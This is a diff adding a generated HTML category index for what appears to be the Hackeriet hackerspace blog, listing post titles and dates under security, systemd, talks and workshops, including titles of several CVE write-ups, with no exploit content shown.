+        <p>
+            <a href="/hackeriet-and-tor-in-2016/">TOR at hackeriet in 2016</a> <small>01 May 2017</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        </div>
+        
+        <a onClick="showStuff('cat-#security')" class="codinfox-category-mark" style="color:#999;text-decoration: none;"> security </a> &nbsp;&nbsp;
+        <div id="cat-#security">
+        
+        
+        <p>
+            <a href="/filename-rename-in-pass/">CVE-2020-28086 information leakage through third party service in pass</a> <small>18 Sep 2021</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/cve-2020-14423-convos-generates-predictable-secret/">CVE-2020-14423: Convos 4.19 Generates a Predictable Secret</a> <small>19 Jun 2020</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/mojolicious-executing-code-with-url_escape/">Mojolicious: Executing code with url_escape()</a> <small>08 Apr 2019</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/cve-2018-20162-digi-lr54-restricted-shell-escape/">CVE-2018-20162: Digi TransPort LR54 Restricted Shell Escape</a> <small>17 Feb 2019</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/cve-2019-6690-python-gnupg-vulnerability/">CVE-2019-6690: Improper Input Validation in python-gnupg</a> <small>24 Jan 2019</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/lvm-in-luks-with-encrypted-boot-partition-and-suspend-to-disk/">LVM in LUKS with encrypted boot and suspend-to-disk</a> <small>03 May 2018</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/understanding-jackson-deserialization-exploits/">Jackson deserialization exploits</a> <small>15 Dec 2017</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/finding-timing-vulnerabilities-in-jasypt/">Finding side channel attacks in jasypt 1.8</a> <small>11 Jul 2017</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/detect-security-holes-during-build/">Detect security problems at compile time</a> <small>02 Apr 2017</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        </div>
+        
+        <a onClick="showStuff('cat-#systemd')" class="codinfox-category-mark" style="color:#999;text-decoration: none;"> systemd </a> &nbsp;&nbsp;
+        <div id="cat-#systemd">
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/systemd-service-type-notify-and-watchdog-c/">Using systemd services of Type=notify with Watchdog in C</a> <small>15 Mar 2018</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        </div>
+        
+        <a onClick="showStuff('cat-#talks')" class="codinfox-category-mark" style="color:#999;text-decoration: none;"> talks </a> &nbsp;&nbsp;
+        <div id="cat-#talks">
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/oslo-nixos-minicon-report/">Oslo NixOS MiniCon 2020 report</a> <small>07 Mar 2020</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/hackeriet-10/">Hackeriet 10 years</a> <small>20 Feb 2020</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/oslo-nixos-minicon-2020/">Welcome to Oslo NixOS MiniCon 2020!</a> <small>29 Jan 2020</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/functional-esp8266/">Talk 15 Sept: Functional Embedded Programming on the ESP8266</a> <small>15 Sep 2018</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/open-source-mesh-workshop/">Workshop 10-11 Oct: Build an open source mesh node</a> <small>28 Aug 2018</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        </div>
+        
+        <a onClick="showStuff('cat-#workshops')" class="codinfox-category-mark" style="color:#999;text-decoration: none;"> workshops </a> &nbsp;&nbsp;
+        <div id="cat-#workshops">
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/hackeriet-10/">Hackeriet 10 years</a> <small>20 Feb 2020</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        </div>
+        
+    </div>
+
+    <div class="wrapper-footer">
+      <div class="container">
+        <footer class="footer">
+          
+
+<a href="https://www.facebook.com/hackeriet"><i class="svg-icon facebook"></i></a>
+
+<a href="https://github.com/hackeriet"><i class="svg-icon github"></i></a>
+
+
+
+<a href="/feed.xml"><i class="svg-icon rss"></i></a>
+<a href="https://www.twitter.com/hackeriet"><i class="svg-icon twitter"></i></a>
+
+
+
+        </footer>
+      </div>
+    </div>
+
+    
+
+  </body>
+</html>
